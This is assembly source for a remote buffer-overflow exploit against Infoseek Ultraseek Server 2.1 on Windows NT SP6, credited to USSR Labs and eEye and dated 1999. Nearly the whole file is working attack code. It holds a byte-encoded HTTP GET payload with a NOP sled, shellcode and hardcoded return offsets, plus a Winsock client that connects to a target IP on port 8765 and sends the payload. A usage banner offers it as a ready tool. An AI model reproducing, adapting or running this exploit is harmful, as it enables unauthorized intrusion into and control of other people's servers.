;============================================================================
; Source by: USSR Labs                                                     ==
; www.ussrback.com                                                         ==
;============================================================================

.386p
locals
jumps
.model flat, stdcall

extrn   GetCommandLineA:PROC
extrn   GetStdHandle:PROC
extrn   WriteConsoleA:PROC
extrn   ExitProcess:PROC
extrn   WSAStartup:PROC
extrn   connect:PROC
extrn   send:PROC
extrn   recv:PROC
extrn   WSACleanup:PROC
extrn   htons:PROC
extrn   socket:PROC
extrn   inet_addr:PROC
extrn   closesocket:PROC
Extrn	GetModuleHandleA	      : PROC
Extrn	GetProcAddress		      : PROC
Extrn	lstrlenA		      : PROC

.data


sploit_code label byte
 DB 71,69,84,32,47,144,144,144,144,144,144,235,14,117,115,115,114,101,101,121
 DB 101,46,116,120,116,1,1,102,129,196,16,1,102,129,196,16,1,102,129,196
 DB 16,1,102,129,196,16,1,102,129,196,16,1,139,199,191,79,244,128,2,51
 DB 201,65,243,170,51,255,87,131,199,31,71,87,106,2,51,255,87,87,51,255
 DB 102,129,199,192,16,193,231,8,193,231,8,193,231,8,87,191,67,244,128,2
 DB 87,184,20,226,2,120,255,16,184,31,224,2,120,64,255,16,144,144,144,144
 DB 144,144,144,144,144,144,64,244,128,2,64,244,128,2,47,32,72,84,84,80
 DB 47,49,46,48,13,10,13,10

;DB 'GET /'
;DB 144,144,144,144,144,144,235,14,117,115,115,114,101,101,121,101,46,116,120
;DB 116,1,1,102,129,196,16,1,102,129,196,16,1,102,129,196,16,1,102,129
;DB 196,16,1,102,129,196,16,1,139,199,191,79,244,128,2,51,201,65,243,170
;DB 51,255,87,131,199,31,71,87,106,2,51,255,87,87,51,255,102,129,199,192
;DB 16,193,231,8,193,231,8,193,231,8,87,191,67,244,128,2,87,184,20,226
;DB 2,120,255,16,184,31,224,2,120,64,255,16,144,144,144,144,144,144,144,144
;DB 144,144
;DD 280f440H                ;servicepack 6 offsets
;DD 280f440H                ;servicepack 6 offsets
;DB '/ HTTP/1.0',13,10,13,10
sploit_code_length   equ     $-sploit_code

Copy            db "USSR|EEYE Remote exploit for Infoseek Ultraseek Server 2.1",13,10
                db "For remote machine NT With Sp6",13,10
                db "http://www.ussrback.com | http://www.eeye.com",13,10
                db "Nov/Dec 99",13,10
                db "Usage: ultrahack HostIp", 13, 10,0
Copyl		equ $-Copy

wsadescription_len equ 256
wsasys_status_len equ 128

WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends

sockaddr_in struct
sin_family dw ?
sin_port dw ?
sin_addr dd ?
sin_zero db 8 dup (0)
sockaddr_in ends

wsadata WSAdata
sin sockaddr_in
sock dd ?
numbase dd 10
hostParamether db 256 dup (?)
buffer dd 1000 dup (0)
buffer2 dd 1000 dup (0)

i_cant_connect	db 'fata: sorry i can',27h,'t connect to this host!',13,10
i_cant_connectl equ $-i_cant_connect

SendingExploit  db 'ok!: Sending Exploit Code....',13,10
SendingExploitl equ $-SendingExploit

include code.inc

cchWritten dd 0
ConHandle dd 0

.code
start:
	xor	eax,eax
	xor	ebx,ebx
	xor	edx,edx
	xor	ecx,ecx
	xor	esi,esi
	xor	edi,edi
	xor	ebp,ebp
	Push	-11
	Call	GetStdHandle
	Mov	[ConHandle],EAX
	call	GetCommandLineA
	mov	edi, eax
	mov	ecx, -1
	xor	al, al
	push	edi
	repnz	scasb
	not	ecx
	pop	edi
	mov	al, 20h
	repnz	scasb
	dec	ecx
	mov	esi, edi
	cmp	byte ptr [esi],0
	je	no_command_line
	cmp	byte ptr [esi],20
	je	incrementa1
continue:
        lea     edi, hostParamether
	rep	movsb
	push	offset wsadata
	push	0101h
	call	WSAStartup
	xor	eax, eax
	push	eax
	inc	eax
	push	eax
	inc	eax
	push	eax
	call	socket
	mov	sock, eax
	mov	sin.sin_family, 2
        mov     eax,8765d                         ; port
	push	eax
	call	htons

	mov	sin.sin_port, ax
        push    offset hostParamether
	call	inet_addr

	mov	sin.sin_addr, eax
	push	size sin
	push	offset sin
	push	sock
	call	connect
	or	eax, eax
	jz	connectionworking
	Write_Console <offset i_cant_connect > <i_cant_connectl >
	jmp	the_end
incrementa1:
	inc   si
	jmp   continue
connectionworking:
        xor     eax, eax
	push	eax
	push	sploit_code_length
	push	offset sploit_code
	push	sock
	call	send
        Write_Console <offset SendingExploit > <SendingExploitl >
the_end:
	push	sock
	call	closesocket
	call	WSACleanup
final_exit:
	push	0
	call	ExitProcess
no_command_line:
	Write_Console <offset Copy > <Copyl >
	jmp   final_exit
end start

